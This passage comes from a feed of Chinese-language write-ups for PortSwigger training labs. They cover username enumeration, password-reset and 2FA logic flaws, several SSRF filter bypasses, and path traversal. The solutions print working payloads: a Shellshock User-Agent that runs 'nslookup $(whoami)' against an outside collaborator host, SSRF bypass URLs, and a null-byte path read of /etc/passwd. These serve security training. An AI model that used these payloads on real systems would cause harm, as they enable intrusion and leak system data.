&lt;li>在过滤器中将&lt;code>status code 2xx&lt;/code>过滤，即可获得正确的&lt;code>password&lt;/code>为&lt;code>987654321&lt;/code>&lt;/li>
&lt;li>使用&lt;code>ap:987654321&lt;/code>登录后即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Username enumeration via subtly different responses</title><link>/portswigger-posts/authentication-lab-username-enumeration-via-subtly-different-responses/</link><pubDate>Sun, 01 Dec 2024 14:40:34 +0800</pubDate><guid>/portswigger-posts/authentication-lab-username-enumeration-via-subtly-different-responses/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-subtly-different-responses-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-subtly-different-responses-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
&lt;li>尝试随机输入&lt;code>Username&lt;/code>和&lt;code>Password&lt;/code>登录，页面上出现&lt;code>Invalid username or password.&lt;/code>关键字
&lt;img alt="Invalid username" src="/img/2024/authentication-lab-username-enumeration-via-subtly-different-responses-2.jpg">&lt;/li>
&lt;li>使用Burp Intruder对username进行遍历，字典使用题目中&lt;code>Candidate usernames&lt;/code>所提供的列表；扫描结束后，使用过滤器中使用&lt;code>Negative search&lt;/code>功能过滤出存在的&lt;code>username&lt;/code>，且其返回内容包含&lt;code>Invalid username or password.&lt;/code>
&lt;img alt="Invalid username" src="/img/2024/authentication-lab-username-enumeration-via-subtly-different-responses-3.jpg">&lt;/li>
&lt;li>根据过滤结果存在的&lt;code>username&lt;/code>为&lt;code>guest&lt;/code>，且其关键字为&lt;code>Invalid username or password&lt;/code>
&lt;img alt="Invalid username" src="/img/2024/authentication-lab-username-enumeration-via-subtly-different-responses-4.jpg">&lt;/li>
&lt;li>下一步在确认&lt;code>username&lt;/code>参数的前提下，继续扫描&lt;code>password&lt;/code>参数，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表&lt;/li>
&lt;li>在过滤器中将&lt;code>status code 2xx&lt;/code>过滤，即可获得正确的&lt;code>password&lt;/code>为&lt;code>mustang&lt;/code>
&lt;img alt="Invalid username" src="/img/2024/authentication-lab-username-enumeration-via-subtly-different-responses-5.jpg">&lt;/li>
&lt;li>使用&lt;code>guest:mustang&lt;/code>登录后即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Password reset broken logic</title><link>/portswigger-posts/authentication-lab-password-reset-broken-logic/</link><pubDate>Sun, 01 Dec 2024 12:09:59 +0800</pubDate><guid>/portswigger-posts/authentication-lab-password-reset-broken-logic/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-password-reset-broken-logic-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-password-reset-broken-logic-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>后进入登录页面&lt;/li>
&lt;li>点击登录页面下方&lt;code>Forgot password?&lt;/code>进行忘记密码流程，在输入框中输入&lt;code>wiener&lt;/code>，尝试重置&lt;code>wiener&lt;/code>用户密码&lt;/li>
&lt;li>回到登录页面使用&lt;code>wiener:peter&lt;/code>登录&lt;code>wiener&lt;/code>用户，并点击上方&lt;code>Email client&lt;/code>查看重置密码邮件，点击链接后进入重置密码页面&lt;/li>
&lt;li>填入所需信息后送出，请求为
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password?temp-forgot-password-token=pyaq699vscgleejbj3y755qhgxy02icn &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a060049043383ec80a812580035006b.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>temp-forgot-password-token=pyaq699vscgleejbj3y755qhgxy02icn&amp;amp;username=wiener&amp;amp;new-password-1=123&amp;amp;new-password-2=123
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改&lt;code>username&lt;/code>参数为&lt;code>carlos&lt;/code>后再次发送请求，登出&lt;code>wiener&lt;/code>用户后回到登录页面使用&lt;code>carlos:123&lt;/code>登录即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: 2FA simple bypass</title><link>/portswigger-posts/authentication-lab-2fa-simple-bypass/</link><pubDate>Sun, 01 Dec 2024 11:45:06 +0800</pubDate><guid>/portswigger-posts/authentication-lab-2fa-simple-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-2fa-simple-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-2fa-simple-bypass-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>后进入登录页面&lt;/li>
&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录，此时需要输入&lt;code>4-digit security code&lt;/code>，通过上方的&lt;code>Email client&lt;/code>按钮跳转页面后获得&lt;code>security code&lt;/code>，输入后跳转至&lt;code>/my-account&lt;/code>&lt;/li>
&lt;li>尝试使用&lt;code>carlos:montoya&lt;/code>进行登录，登录后仍然需要输入&lt;code>4-digit security code&lt;/code>，但此时上方没有&lt;code>Email client&lt;/code>按钮，所以无法获得&lt;code>security code&lt;/code>&lt;/li>
&lt;li>根据&lt;code>wiener&lt;/code>用户成功的登录逻辑，输入&lt;code>security code&lt;/code>后会跳转至&lt;code>/my-account&lt;/code>，所以在此之间将url修改为&lt;code>/my-account&lt;/code>，即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Username enumeration via different responses</title><link>/portswigger-posts/authentication-lab-username-enumeration-via-different-responses/</link><pubDate>Sun, 01 Dec 2024 11:02:51 +0800</pubDate><guid>/portswigger-posts/authentication-lab-username-enumeration-via-different-responses/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-different-responses-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-username-enumeration-via-different-responses-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
&lt;li>尝试随机输入&lt;code>Username&lt;/code>登录，页面上出现&lt;code>Invalid username&lt;/code>关键字
&lt;img alt="Invalid username" src="/img/2024/authentication-lab-username-enumeration-via-different-responses-2.jpg">&lt;/li>
&lt;li>使用Burp Intruder对username进行遍历，字典使用题目中&lt;code>Candidate usernames&lt;/code>所提供的列表；扫描结束后，使用过滤器中使用&lt;code>Negative search&lt;/code>功能过滤出存在的&lt;code>username&lt;/code>，且其返回内容包含&lt;code>Incorrect password&lt;/code>
&lt;img alt="Negative search" src="/img/2024/authentication-lab-username-enumeration-via-different-responses-3.jpg">&lt;/li>
&lt;li>根据过滤结果存在的&lt;code>username&lt;/code>为&lt;code>adm&lt;/code>，下一步在确认&lt;code>username&lt;/code>参数的前提下，继续扫描&lt;code>password&lt;/code>参数，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表&lt;/li>
&lt;li>同样在过滤器中使用&lt;code>Negative search&lt;/code>功能过滤，即可获得正确的&lt;code>password&lt;/code>为&lt;code>princess&lt;/code>
&lt;img alt="Negative search" src="/img/2024/authentication-lab-username-enumeration-via-different-responses-4.jpg">&lt;/li>
&lt;li>使用&lt;code>adm:princess&lt;/code>登录后即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Blind SSRF with Shellshock exploitation</title><link>/portswigger-posts/ssrf-lab-shellshock-exploitation/</link><pubDate>Sat, 30 Nov 2024 18:37:38 +0800</pubDate><guid>/portswigger-posts/ssrf-lab-shellshock-exploitation/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-shellshock-exploitation-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-shellshock-exploitation-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>同&lt;a href="/portswigger-posts/ssrf-lab-out-of-band-detection/">前题&lt;/a>，使用Burp Collaborator作为带外信息收集&lt;/li>
&lt;li>此题建议使用&lt;a href="https://blog.cloudflare.com/inside-shellshock/">Shellshock&lt;/a>执行系统命令获得OS用户&lt;/li>
&lt;li>在&lt;code>User-Agent&lt;/code>请求头写入Shellshock payload，在&lt;code>Referer&lt;/code>请求头指定内部服务器地址
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product?productId=8 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a8c00a60471f6ef82a26f06005400ee.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">() { ignored;};/usr/bin/nslookup $(whoami).g9qshqvqxiflz8z00kvd9oxt5kbcz4nt.oastify.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">http://192.168.0.xxx:8080&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>使用Burp Intruder遍历内部服务器地址(&lt;code>Referer&lt;/code>请求头)&lt;/li>
&lt;li>回到Burp Collaborator观察即可获得OS用户(peter-PjP23W)，提交至页面后结束
&lt;img alt="DNS query" src="/img/2024/ssrf-lab-shellshock-exploitation-2.jpg">&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Blind SSRF with out-of-band detection</title><link>/portswigger-posts/ssrf-lab-out-of-band-detection/</link><pubDate>Sat, 30 Nov 2024 18:23:28 +0800</pubDate><guid>/portswigger-posts/ssrf-lab-out-of-band-detection/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-out-of-band-detection-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-out-of-band-detection-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>此题目的是让用户熟悉Burp Collaborator如何使用&lt;/li>
&lt;li>首先在Burp -&amp;gt; Collaborator -&amp;gt; 点击Copy to clipboard&lt;/li>
&lt;li>将上步获得的url替换请求中的Referer，例如
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product?productId=1 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">https://3qufydcde5w8gvgnh7c0qbegm7sygp4e.oastify.com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>发送请求后在Collaborator面板即可观察到相关信息&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with filter bypass via open redirection vulnerability</title><link>/portswigger-posts/ssrf-lab-ssrf-filter-bypass-via-open-redirection/</link><pubDate>Sat, 30 Nov 2024 15:55:02 +0800</pubDate><guid>/portswigger-posts/ssrf-lab-ssrf-filter-bypass-via-open-redirection/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-ssrf-filter-bypass-via-open-redirection-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-ssrf-filter-bypass-via-open-redirection-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>目标入口同&lt;a href="/portswigger-posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>&lt;/li>
&lt;li>直接在请求体中设置&lt;code>http://192.168.0.12:8080/admin&lt;/code>会获得错误
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">48&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;Invalid external stock check url &amp;#39;Invalid URL&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>观察页面下方有&lt;code>Next product&lt;/code>按钮，对应请求为
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product/nextProduct?currentProductId=1&amp;amp;path=/product?productId=2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>点击按钮后，页面将跳转至path参数地址，即为&lt;code>/product?productId=2&lt;/code>，利用此特性，将请求体设置为&lt;code>/product/nextProduct?currentProductId=1&amp;amp;path=&lt;/code>，后面接上目的地址，最终url请求体为&lt;code>%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://192.168.0.12:8080/admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with whitelist-based input filter</title><link>/portswigger-posts/ssrf-lab-ssrf-with-whitelist-filter/</link><pubDate>Sat, 30 Nov 2024 15:19:16 +0800</pubDate><guid>/portswigger-posts/ssrf-lab-ssrf-with-whitelist-filter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-ssrf-with-whitelist-filter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-ssrf-with-whitelist-filter-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>目标入口同&lt;a href="/portswigger-posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题部署了1个防止SSRF的防御措施&lt;/li>
&lt;li>若将请求体设置为&lt;code>http://localhost/admin&lt;/code>会获得以下返回
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;External stock check host must be stock.weliketoshop.net&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>最终尝试到请求体为&lt;code>http://localhost%2523@stock.weliketoshop.net/admin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with blacklist-based input filter</title><link>/portswigger-posts/ssrf-lab-ssrf-with-blacklist-filter/</link><pubDate>Sat, 30 Nov 2024 14:51:44 +0800</pubDate><guid>/portswigger-posts/ssrf-lab-ssrf-with-blacklist-filter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-ssrf-with-blacklist-filter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-ssrf-with-blacklist-filter-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>目标入口同&lt;a href="/portswigger-posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题部署了2个简单的防止SSRF的防御措施&lt;/li>
&lt;li>2个简单的防止SSRF的防御措施分别在&lt;code>localhsot&lt;/code>以及&lt;code>admin&lt;/code>
&lt;ul>
&lt;li>&lt;code>localhsot&lt;/code>可以替换为&lt;code>lOcAlHost&lt;/code>或&lt;code>127.0.0.1&lt;/code>的变形，例如&lt;code>2130706433&lt;/code>、&lt;code>017700000001&lt;/code>、&lt;code>127.1. &lt;/code>&lt;/li>
&lt;li>&lt;code>admin&lt;/code>使用大小写绕过，例如&lt;code>Admim&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>最终请求体为&lt;code>http://127.1/Admin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://127.1/Admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Basic SSRF against another back-end system</title><link>/portswigger-posts/ssrf-lab-basic-ssrf-against-backend-system/</link><pubDate>Sat, 30 Nov 2024 11:47:06 +0800</pubDate><guid>/portswigger-posts/ssrf-lab-basic-ssrf-against-backend-system/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-basic-ssrf-against-backend-system-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-basic-ssrf-against-backend-system-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>目标入口同&lt;a href="/portswigger-posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题需要自行寻找admin interface&lt;/li>
&lt;li>使用Burp suite Intruder功能，自动遍历题目给出的范围&lt;code>192.168.0.x&lt;/code>，请求体为&lt;code>stockApi=http://192.168.0.§1§:8080/admin&lt;/code>，Number range从0至254&lt;/li>
&lt;li>根据扫描结果，在参数为&lt;code>58&lt;/code>时获得response code 200，所以admin interface为&lt;code>http://192.168.0.58:8080/admin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://192.168.0.58:8080/admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Basic SSRF against the local server</title><link>/portswigger-posts/ssrf-lab-basic-ssrf-against-localhost/</link><pubDate>Sat, 30 Nov 2024 10:52:18 +0800</pubDate><guid>/portswigger-posts/ssrf-lab-basic-ssrf-against-localhost/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-basic-ssrf-against-localhost-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/ssrf-lab-basic-ssrf-against-localhost-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击任一个商品(View details)进入到商品详细页面，每个页面最底下有题目中提到的查看库存功能，点击按钮后可以查看不同地区的库存情况
&lt;img alt="stock check feature" src="/img/2024/ssrf-lab-basic-ssrf-against-localhost-2.jpg">&lt;/li>
&lt;li>查看库存对应的请求内容与返回如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a82001403d00c83834cf749008e00de.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">107&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/plain; charset=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">831&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>观察上述请求与返回，可以猜测后端逻辑为请求&lt;code>http://stock.weliketoshop.net:8080&lt;/code>并带上对应参数后将库存数量返回&lt;/li>
&lt;li>修改&lt;code>stockApi&lt;/code>参数值为题目要求的&lt;code>http://localhost/admin&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a82001403d00c83834cf749008e00de.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">107&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>stockApi=http://localhost/admin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>在返回数据中得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>/admin/delete?username=carlos&lt;/code>，将此拼接在stockApi后即可达成目的&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, validation of file extension with null byte bypass</title><link>/portswigger-posts/file-path-traversal-lab-validate-file-extension-null-byte-bypass/</link><pubDate>Thu, 28 Nov 2024 23:21:04 +0800</pubDate><guid>/portswigger-posts/file-path-traversal-lab-validate-file-extension-null-byte-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-validate-file-extension-null-byte-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-validate-file-extension-null-byte-bypass-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>请求内容同&lt;a href="/portswigger-posts/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
&lt;li>但不同于前题，题目中提到&lt;code>The application validates that the supplied filename ends with the expected file extension.&lt;/code>；使用&lt;code>null byte&lt;/code>通过文件扩展名检查&lt;/li>
&lt;li>最终url为&lt;code>/image?filename=../../../etc/passwd%00.jpg&lt;/code>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, validation of start of path</title><link>/portswigger-posts/file-path-traversal-lab-validate-start-of-path/</link><pubDate>Thu, 28 Nov 2024 23:14:23 +0800</pubDate><guid>/portswigger-posts/file-path-traversal-lab-validate-start-of-path/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-validate-start-of-path-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
